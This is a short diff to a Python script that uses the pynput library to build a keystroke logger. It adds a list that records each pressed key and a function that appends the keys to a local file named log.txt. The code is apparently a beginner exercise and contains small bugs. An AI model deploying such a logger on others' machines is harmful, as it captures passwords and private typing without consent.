@@ -2,12 +2,27 @@
 import pynput
 
 from pynput.keyboard import Key, Listener
-
-
+#creating a count to track when to save the keystrokes into log
+count = 0
+#list to store the keys
+keys = []
+#function to record when a key is pressed
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     #log into console what keys are pressed
     print("(0) pressed".format(key))
 
+
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(key)
+
+#function to record when a key is released
 def on_release(key):
     #break out fo the program when the Escape key is pressed
     if key == Key.esc:
